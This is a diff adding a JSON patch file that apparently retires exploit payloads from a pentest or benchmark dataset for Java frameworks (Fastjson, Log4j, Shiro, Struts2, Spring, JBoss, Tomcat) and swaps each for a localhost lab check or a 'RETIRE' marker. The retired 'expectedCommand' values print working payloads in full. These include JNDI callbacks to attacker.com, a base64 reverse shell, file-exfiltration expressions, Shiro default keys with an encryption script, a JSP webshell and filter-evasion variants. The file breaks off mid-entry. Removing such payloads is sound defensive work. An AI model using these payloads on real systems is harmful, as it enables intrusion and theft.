@@ -1,0 +1,531 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "fastjson-rce",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "发送JSON请求，观察响应:\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"attacker.com\"}\n观察是否有DNS回调",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/api/lab/fastjson/parse\" -H \"Content-Type: application/json\" -H \"X-Request-ID: fastjson-policy-001\" --data '{\"@type\":\"java.util.HashMap\",\"marker\":\"FASTJSON_POLICY_CANARY_A1\"}' | jq -e '.marker == \"FASTJSON_POLICY_CANARY_A1\" and .external_lookup == false'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/Exploit\",\"autoCommit\":true}",
+          "command": "RETIRE fastjson-rce JdbcRowSet JNDI gadget payload"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "使用JNDIExploit:\njava -jar JNDIExploit.jar -i attacker.com\n或使用marshalsec:\njava -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389",
+          "command": "unzip -p fixtures/fastjson.jar META-INF/MANIFEST.MF | grep -Ei '^(Implementation|Specification)-(Title|Version):'"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "1.2.47版本绕过:\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}}",
+          "command": "RETIRE fastjson-rce AutoType class-loading bypass chain"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Unicode编码@type:\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n\n# 十六进制编码:\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}\n\n# 嵌套JSON混淆:\n{\"a\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}}",
+          "command": "RETIRE fastjson-rce encoded and nested JNDI gadget variants"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# BCEL ClassLoader(Fastjson 1.1.15-1.2.24):\n{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\",\"\":\"$$BCEL$$$l$8b...\"}\n\n# Fastjson 1.2.47 AutoType绕过:\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}}\n\n# Fastjson 1.2.68 expectClass绕过:\n{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}",
+          "command": "RETIRE fastjson-rce BCEL and version-specific gadget chains"
+        }
+      ]
+    },
+    {
+      "id": "jboss-vuln",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# CVE-2015-7501\n# 发送恶意序列化对象\nPOST /invoker/JMXInvokerServlet HTTP/1.1\nContent-Type: application/x-java-serialized-object\n\n# 使用ysoserial生成payload\njava -jar ysoserial.jar CommonsCollections1 \"id\" > payload.ser\n\n# 发送\ncurl -X POST -H \"Content-Type: application/x-java-serialized-object\" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet",
+          "command": "curl --silent --show-error --max-time 5 -X OPTIONS \"http://127.0.0.1:18080/invoker/JMXInvokerServlet\" -H \"X-Request-ID: jboss-invoker-001\" -D - -o /dev/null | grep -Ei '^(HTTP/|Allow:|WWW-Authenticate:)'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 访问JMX Console\nhttp://target/jmx-console/\n\n# 查找deploy方法\n# 找到 jboss.system:service=MainDeployer\n\n# 部署远程War包\n# 使用deploy方法，URL参数指向恶意War\nhttp://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war\n\n# 访问部署的Shell\nhttp://target/shell/cmd.jsp?cmd=id",
+          "command": "code=$(curl --silent --show-error --max-time 5 -o /dev/null -w '%{http_code}' \"http://127.0.0.1:18080/jmx-console/\" -H \"X-Request-ID: jboss-console-001\"); printf '%s\\n' \"$code\"; test \"$code\" = 401 -o \"$code\" = 403 -o \"$code\" = 404"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用BeanShell部署\n# 找到 jboss.scripts:service=BSHDeployer\n\n# 执行BeanShell脚本\n# 通过createScriptDeployment方法\n\n# 构造恶意脚本\nimport java.io.*;\nRuntime rt = Runtime.getRuntime();\nProcess p = rt.exec(\"id\");\nInputStream is = p.getInputStream();\nBufferedReader reader = new BufferedReader(new InputStreamReader(is));\nString line;\nwhile((line = reader.readLine()) != null) {\n    print(line);\n}",
+          "command": "RETIRE jboss-vuln BeanShell process-execution deployment script"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# JexBoss\ngit clone https://github.com/joaomatosf/jexboss\ncd jexboss\npython jexboss.py -host http://target\n\n# 自动化利用\npython jexboss.py -mode file-scan -file hosts.txt",
+          "command": "docker exec jboss-lab /opt/jboss/wildfly/bin/jboss-cli.sh --connect --commands='version,/core-service=management:read-resource(recursive=false)'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 不同端点\n/invoker/JMXInvokerServlet\n/invoker/EJBInvokerServlet\n/invoker/readonly/JMXInvokerServlet\n/jmx-console/\n/web-console/",
+          "command": "for path in invoker/JMXInvokerServlet invoker/EJBInvokerServlet jmx-console web-console; do curl --silent --show-error --max-time 5 -o /dev/null -w \"$path %{http_code}\\n\" \"http://127.0.0.1:18080/$path\" -H \"X-Request-ID: jboss-surface-001\"; done"
+        }
+      ]
+    },
+    {
+      "id": "log4j-rce",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "在任意输入点注入:\n${jndi:ldap://attacker.com/test}\n观察是否有DNS回调",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/api/lab/log4j/log\" -H \"Content-Type: application/json\" -H \"X-Request-ID: log4j-lookup-001\" --data '{\"message\":\"LOOKUP_CANARY_${java:version}\"}' | jq -e '.request_id and .network_lookup == false and .logged_value'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "${jndi:ldap://${env:USER}.attacker.com}\n${jndi:ldap://${sys:java.version}.attacker.com}\n外带环境变量或系统属性",
+          "command": "RETIRE log4j-rce environment and system-property DNS exfiltration lookups"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "使用JNDIExploit或rogue-jndi:\njava -jar JNDIExploit.jar -i attacker.com\n构造payload:\n${jndi:ldap://attacker.com:1389/Basic/Command/base64/d2hvYW1p}",
+          "command": "unzip -p fixtures/log4j-core.jar META-INF/MANIFEST.MF | grep -Ei '^(Implementation|Specification)-(Title|Version):|^Bundle-Version:'"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "${jndi:ldap://attacker.com:1389/Basic/Command/base64/YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}\nBase64解码为: bash -i >& /dev/tcp/attacker/4444 0>&1",
+          "command": "RETIRE log4j-rce reverse-shell JNDI lookup"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "${${lower:j}ndi:ldap://attacker.com}\n${${upper:j}ndi:${lower:l}dap://attacker.com}\n${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}",
+          "command": "RETIRE log4j-rce lower-upper and character-fragment filter-evasion lookups"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com}\n${jndi:dns://attacker.com}",
+          "command": "RETIRE log4j-rce protocol and nested-lookup filter-evasion variants"
+        }
+      ]
+    },
+    {
+      "id": "shiro-deserialize",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 检测rememberMe Cookie\n# 响应中有rememberMe=deleteMe表示使用Shiro\n\n# 使用工具检测\ngit clone https://github.com/sv3nbeast/ShiroScan\ncd ShiroScan\njava -jar shiro_scan.jar -t http://target\n\n# 或使用Burp插件\n# ShiroScan Burp插件",
+          "command": "curl --silent --show-error --max-time 5 -D - -o /dev/null \"http://127.0.0.1:18080/shiro-lab/\" -H \"Cookie: rememberMe=SHIRO_INVALID_CANARY\" -H \"X-Request-ID: shiro-cookie-001\" | grep -Ei '^(HTTP/|Set-Cookie:.*rememberMe)'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 生成恶意序列化对象\njava -jar ysoserial.jar CommonsCollections2 \"id\" > payload.ser\n\n# 使用Shiro内置密钥加密\n# 默认密钥: kPH+bIxk5D2deZiIxcaaaA==\n\n# Python加密脚本\nimport base64\nfrom Crypto.Cipher import AES\n\ndef encode_rememberme(command):\n    # 生成payload\n    payload = os.popen(f\"java -jar ysoserial.jar CommonsCollections2 \\\"{command}\\\"\").read()\n    \n    # AES加密\n    key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")\n    cipher = AES.new(key, AES.MODE_CBC, iv=key)\n    \n    # PKCS5Padding\n    pad = 16 - len(payload) % 16\n    payload += bytes([pad]) * pad\n    \n    encrypted = cipher.encrypt(payload)\n    return base64.b64encode(encrypted).decode()",
+          "command": "RETIRE shiro-deserialize ysoserial gadget encryption and default-key workflow"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用curl\ncurl -H \"Cookie: rememberMe=<ENCODED_PAYLOAD>\" http://target\n\n# 使用工具\ngit clone https://github.com/insightglacier/Shiro_exploit\ncd Shiro_exploit\npython3 shiro_exploit.py -t http://target -c \"id\"\n\n# 使用ShiroAttack\ngit clone https://github.com/acgbfull/ShiroAttack\ncd ShiroAttack\njava -jar ShiroAttack.jar",
+          "command": "RETIRE shiro-deserialize exploit-tool and encoded-gadget delivery workflow"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 常见Shiro密钥\nkPH+bIxk5D2deZiIxcaaaA==\n4AvVhmFLUs0KTA3Kprsdag==\nZ3VucwAAAAAAAAAAAAAAAA==\nfCq+/xW488hMTCD+cmJ3aQ==\n1QWLxg+NYmxraMoxAXu/Iw==\n25BsmdYwjnfcWmnhAciDDg==\n2AvVhdsgUs0F8SZSnWd+Zw==\n6ZmI6I2j5Y+R54aHjOqYzg==\n\n# 尝试不同密钥\n# 或爆破密钥",
+          "command": "grep -E '^(shiro.version|rememberMe.cipherMode|rememberMe.keySource|serializationFilter)=' fixtures/shiro-test-runtime.properties"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 不同Gadget链\nCommonsCollections2\nCommonsBeanutils1\nJdk7u21\nJRMPClient\n\n# 根据目标环境选择\n# 某些链可能被过滤",
+          "command": "RETIRE shiro-deserialize gadget-chain selection list"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 使用工具爆破密钥\ngit clone https://github.com/insightglacier/Shiro_exploit\npython3 shiro_exploit.py -t http://target -f keys.txt\n\n# 或使用ShiroScan\njava -jar shiro_scan.jar -t http://target -f keys.txt",
+          "command": "RETIRE shiro-deserialize rememberMe key brute-force workflow"
+        }
+      ]
+    },
+    {
+      "id": "spring-actuator",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "/actuator\n/actuator/env\n/actuator/health\n/actuator/mappings\n/actuator/configprops\n/actuator/heapdump",
+          "command": "for path in actuator actuator/health actuator/env actuator/mappings; do curl --silent --show-error --max-time 5 -o /dev/null -w \"$path %{http_code}\\n\" \"http://127.0.0.1:18080/$path\" -H \"X-Request-ID: actuator-surface-001\"; done"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "/actuator/env\n查看数据库密码、API密钥等\n/actuator/configprops\n查看配置属性",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 \"http://127.0.0.1:18080/actuator\" -H \"Authorization: Bearer actuator-reviewer-token\" -H \"X-Request-ID: actuator-links-001\" | jq -e '._links | keys'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "curl -o heapdump http://target.com/actuator/heapdump\n使用Memory Analyzer Tool分析\n搜索password、secret等关键词",
+          "command": "RETIRE spring-actuator heap-dump download and secret-search workflow"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "POST /actuator/env\nContent-Type: application/x-www-form-urlencoded\nspring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} return null;}')\n\nPOST /actuator/restart",
+          "command": "RETIRE spring-actuator environment mutation and restart command-execution chain"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 分号路径参数绕过(Spring特性):\n/;/actuator/env\n/actuator;.js/env\n/actuator/..;/actuator/env\n\n# 双URL编码:\n/%61%63%74%75%61%74%6f%72/env\n/actuator/%65%6e%76\n\n# 路径穿越:\n/random/../actuator/env\n/api/v1/../../actuator/heapdump",
+          "command": "RETIRE spring-actuator traversal semicolon and multi-encoding endpoint bypasses"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# HTTP方法覆盖:\nGET /actuator/env HTTP/1.1\nX-HTTP-Method-Override: POST\n\n# Content-Type绕过:\nPOST /actuator/env HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nspring.cloud.bootstrap.location=http://attacker.com/payload.yml\n\n# 大小写绕过:\n/Actuator/Env\n/ACTUATOR/ENV",
+          "command": "RETIRE spring-actuator method-override external-bootstrap and case-bypass variants"
+        }
+      ]
+    },
+    {
+      "id": "spring-cloud",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# CVE-2022-22947\n# 添加恶意路由\nPOST /actuator/gateway/routes/hack HTTP/1.1\nContent-Type: application/json\n\n{\n  \"id\": \"hack\",\n  \"filters\": [{\n    \"name\": \"AddResponseHeader\",\n    \"args\": {\n      \"name\": \"Result\",\n      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\n    }\n  }],\n  \"uri\": \"http://example.com\"\n}\n\n# 刷新路由\nPOST /actuator/gateway/refresh\n\n# 查看结果\nGET /actuator/gateway/routes/hack",
+          "command": "unzip -p fixtures/spring-cloud-gateway-server.jar META-INF/MANIFEST.MF | grep -Ei '^(Implementation|Specification)-(Title|Version):|^Spring-Boot-Version:'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# CVE-2022-22963\n# 修改请求头触发SpEL\nPOST /functionRouter HTTP/1.1\nspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")\nContent-Type: text/plain\n\npayload",
+          "command": "code=$(curl --silent --show-error --max-time 5 -o /dev/null -w '%{http_code}' \"http://127.0.0.1:18080/actuator/gateway/routes\" -H \"Authorization: Bearer spring-user-token\" -H \"X-Request-ID: spring-cloud-gateway-001\"); printf '%s\\n' \"$code\"; test \"$code\" = 401 -o \"$code\" = 403 -o \"$code\" = 404"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# CVE-2020-5410 目录遍历\nGET /..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd\n\n# Eureka Server SSRF\nPOST /eureka/apps\n# 配置serviceUrl指向内网服务",
+          "command": "RETIRE spring-cloud directory-traversal and Eureka SSRF workflow"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# URL编码绕过\n..%252f = ..%2f = ../\n\n# 双重URL编码\n..%252f..%252f",
+          "command": "RETIRE spring-cloud single and double URL-encoding traversal bypasses"
+        }
+      ]
+    },
+    {
+      "id": "spring-spel",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 测试表达式执行\n${7*7}\n#{7*7}\n${T(java.lang.Runtime).getRuntime()}\n\n# 观察响应\n# 如果返回49或执行成功则存在漏洞",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/api/lab/spel/evaluate\" -H \"Content-Type: application/json\" -H \"X-Request-ID: spel-simple-001\" --data '{\"expression\":\"7 * 7\",\"mode\":\"simple\"}' | jq -e '.result == 49 and .type_access == false and .method_invocation == false'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# Runtime执行命令\n${T(java.lang.Runtime).getRuntime().exec(\"id\")}\n#{T(java.lang.Runtime).getRuntime().exec(\"whoami\")}\n\n# ProcessBuilder\n${new java.lang.ProcessBuilder(new String[]{\"id\"}).start()}\n#{new java.lang.ProcessBuilder(new String[]{\"cmd\",\"/c\",\"whoami\"}).start()}\n\n# 反弹Shell\n${T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}\")}",
+          "command": "RETIRE spring-spel Runtime ProcessBuilder and reverse-shell expressions"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 读取文件\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"cat /etc/passwd\").getInputStream())}\n\n# 使用Scanner\n#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"cat /etc/passwd\").getInputStream()).useDelimiter(\"\\\\A\").next()}\n\n# 直接读取\n${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(\"/etc/passwd\"))}",
+          "command": "RETIRE spring-spel process-based and direct file-read expressions"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# DNS外带数据\n${T(java.net.InetAddress).getByName(\"attacker.com\")}\n\n# 外带文件内容\n${T(java.net.InetAddress).getByName(T(java.lang.String).valueOf(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(\"/etc/passwd\"))).substring(0,20)+\".attacker.com\")}",
+          "command": "RETIRE spring-spel DNS lookup and file-content exfiltration expressions"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 绕过关键字过滤\n${T(java.lang.Run\"+\"time).getRun\"+\"time().exec(\"id\")}\n#{T(String).getClass().forName(\"java.la\"+\"ng.Runtime\").getMethod(\"exec\",T(String)).invoke(T(String).getClass().forName(\"java.la\"+\"ng.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}",
+          "command": "grep -E '^(context|typeAccess|methodInvocation|beanResolution|autoGrow)=' fixtures/spring-expression-policy.properties"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 使用反射\n#{T(Class).forName(\"java.lang.Runtime\").getMethod(\"exec\",T(String)).invoke(T(Class).forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}\n\n# 使用ScriptEngine\n#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\"id\\\\\")\")}",
+          "command": "RETIRE spring-spel reflection and ScriptEngine filter-evasion expressions"
+        }
+      ]
+    },
+    {
+      "id": "struts2-ognl",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 访问对象属性\n#object.property\n#object['property']\n\n# 调用方法\n#object.method()\n#object.method(arg1, arg2)\n\n# 静态方法调用\n@package.ClassName@method()\n@java.lang.Runtime@getRuntime()\n\n# 创建对象\nnew java.lang.String(\"test\")\nnew java.lang.ProcessBuilder(new String[]{\"id\"})",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/struts-lab/evaluate\" -H \"X-Request-ID: struts-ognl-simple-001\" --data-urlencode 'value=%{7*7}' | jq -e '.result == 49 and .static_method_access == false and .process_start == false'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 获取DEFAULT_MEMBER_ACCESS\n#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS\n\n# 设置成员访问权限\n#_memberAccess=#dm\n\n# 清除排除类\n#ognlUtil.getExcludedClasses().clear()\n#ognlUtil.getExcludedPackageNames().clear()\n\n# 完整绕过\n(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))",
+          "command": "grep -E '^(struts.version|struts.ognl.allowStaticMethodAccess|struts.excludedClasses|struts.excludedPackageNames)=' fixtures/struts2-security.properties"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用Runtime\n#cmd='id'\n#cmds={'/bin/bash','-c',#cmd}\n#p=new java.lang.ProcessBuilder(#cmds)\n#process=#p.start()\n\n# 获取输出\n#is=#process.getInputStream()\n#ros=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()\n@org.apache.commons.io.IOUtils@copy(#is,#ros)\n\n# 字符串输出\n@org.apache.commons.io.IOUtils@toString(#process.getInputStream())",
+          "command": "RETIRE struts2-ognl Runtime ProcessBuilder and response-copy command chain"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 读取文件\nnew java.util.Scanner(new java.io.File(\"/etc/passwd\")).useDelimiter(\"\\\\A\").next()\n\n# 写入文件\nnew java.io.FileOutputStream(\"shell.jsp\").write(new sun.misc.BASE64Decoder().decodeBuffer(\"BASE64_SHELL\").getBytes())\n\n# 列出目录\nnew java.io.File(\"/\").list()",
+          "command": "RETIRE struts2-ognl file-read webshell-write and directory-list expressions"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Unicode编码\n\\u0069d = id\n\\u0027 = '\n\n# 十六进制\n\\x69\\x64 = id\n\n# 字符串拼接\n\"i\"+\"d\" = \"id\"\n'id'.substring(0,2)",
+          "command": "RETIRE struts2-ognl Unicode hexadecimal and concatenation evasion variants"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 使用反射调用\n#cls=@java.lang.Class@forName(\"java.lang.Runtime\")\n#method=#cls.getMethod(\"getRuntime\")\n#rt=#method.invoke(null)\n#exec=#cls.getMethod(\"exec\",@java.lang.String@class)\n#exec.invoke(#rt,\"id\")",
+          "command": "RETIRE struts2-ognl reflective Runtime invocation chain"
+        }
+      ]
+    },
+    {
+      "id": "struts2-rce",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# CVE-2017-5638\n# Content-Type头注入\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+          "command": "unzip -p fixtures/struts2-core.jar META-INF/MANIFEST.MF | grep -Ei '^(Implementation|Specification)-(Title|Version):|^Bundle-Version:'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# CVE-2017-5638\n# Content-Disposition注入\nContent-Disposition: form-data; name=\"upload\"; filename=\"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}\"\n\n# 完整RCE\nContent-Disposition: form-data; name=\"upload\"; filename=\"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\"",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/struts-lab/upload\" -H 'Content-Disposition: form-data; name=\"upload\"; filename=\"%{7*7}\"' -H \"X-Request-ID: struts-upload-header-001\" -o /dev/null -w '%{http_code}\\n'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# CVE-2018-11776\n# URL命名空间注入\nhttp://target/${(111+111)}/test.action\n# 如果返回222则存在漏洞\n\n# RCE\nhttp://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action",
+          "command": "curl --silent --show-error --max-time 5 -o /dev/null -w '%{http_code}\\n' \"http://127.0.0.1:18080/struts-lab/test.action\" -H \"X-Request-ID: struts-namespace-001\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# CVE-2020-17530\n# OGNL表达式注入\nPOST /action HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nid=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d\n\n# 解码后\nid=%{#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.@java.lang.Runtime@getRuntime().exec('id')}",
+          "command": "RETIRE struts2-rce encoded form-body Runtime execution expression"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# URL编码\n%{#cmd} = %25%7b%23cmd%7d\n\n# Unicode编码\n\\u0025{#cmd}\n\n# 双重编码\n%2525%257b%2523cmd%257d",
+          "command": "RETIRE struts2-rce URL Unicode and double-encoding filter-evasion forms"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 不同表达式语法\n${...}\n%{...}\n#{...}\n@{...}\n\n# 使用静态方法\n@java.lang.Runtime@getRuntime()\nnew java.lang.ProcessBuilder()",
+          "command": "RETIRE struts2-rce expression-syntax and static-method execution variants"
+        }
+      ]
+    },
+    {
+      "id": "tomcat-vuln",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 访问Manager App\nhttp://target/manager/html\n\n# 常见弱口令\ntomcat:tomcat\nadmin:admin\nadmin:tomcat\n\n# 使用工具爆破\nhydra -l tomcat -P passwords.txt target http-get /manager/html",
+          "command": "code=$(curl --silent --show-error --max-time 5 -o /dev/null -w '%{http_code}' \"http://127.0.0.1:18080/manager/html\" -H \"X-Request-ID: tomcat-manager-001\"); printf '%s\\n' \"$code\"; test \"$code\" = 401 -o \"$code\" = 403 -o \"$code\" = 404"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 生成恶意War包\n# cmd.jsp\n<%@ page import=\"java.util.*,java.io.*\"%>\n<% String cmd = request.getParameter(\"cmd\");\nProcess p = Runtime.getRuntime().exec(cmd);\nBufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString line;\nwhile((line = br.readLine()) != null) { out.println(line); }\n%>\n\n# 打包\njar cvf shell.war cmd.jsp\n\n# 通过Manager上传\ncurl -u tomcat:tomcat -T shell.war \"http://target/manager/deploy?path=/shell\"\n\n# 访问Shell\nhttp://target/shell/cmd.jsp?cmd=id",
+          "command": "RETIRE tomcat-vuln WAR webshell packaging deployment and command access"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# AJP文件读取/包含\n# 使用工具\ngit clone https://github.com/chaitin/xray\ncd xray\n./xray_linux_amd64 webscan --plugins phantomjs --url http://target\n\n# 或使用专用工具\ngit clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi\ncd CNVD-2020-10487-Tomcat-Ajp-lfi\npython CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target",
+          "command": "docker exec tomcat-lab sh -lc \"grep -E 'protocol=\\\"AJP|address=|secretRequired=|secret=' /usr/local/tomcat/conf/server.xml\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
